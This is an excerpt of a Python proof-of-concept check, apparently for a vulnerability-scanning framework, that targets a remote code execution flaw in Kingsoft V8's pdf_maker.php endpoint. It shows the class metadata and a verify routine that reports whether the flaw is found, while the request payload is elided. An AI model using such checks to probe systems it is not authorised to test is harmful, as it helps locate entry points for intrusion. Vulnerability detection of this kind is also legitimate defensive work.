...
POC_NAME = "KingsoftRCE"    # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同


class KingsoftRCE(BasePoc):

    poc_info = {
        'poc': {
            'Id': 'vb_2021_0006',    # PoC的VID编号
            'vbid': '',
            'Name': 'Kingsoft V8 pdf_maker.php RCE',    # PoC名称
            'Author': 'mumu',    # PoC作者
    ...
    def verify(self, first=False):
        ...
        # 以下是PoC的检测逻辑
        url = urljoin(target,'/inter/pdf_maker.php')
        headers = {
        ...
        if "Windows" in location:
            ...
            if verbose:
                highlight('[+] Kingsoft V8 pdf_maker.php RCE found')    # 打印高亮信息发现漏洞，其他可用方法包括info()/warn()/error()/highlight()方法分别打印不同等级的信息
        else:
            if verbose:
                highlight('[+] Kingsoft V8 pdf_maker.php RCE not found')    # 打印高亮信息发现漏洞，其他可用方法包括info()/warn()/error()/highlight()方法分别打印不同等级的信息
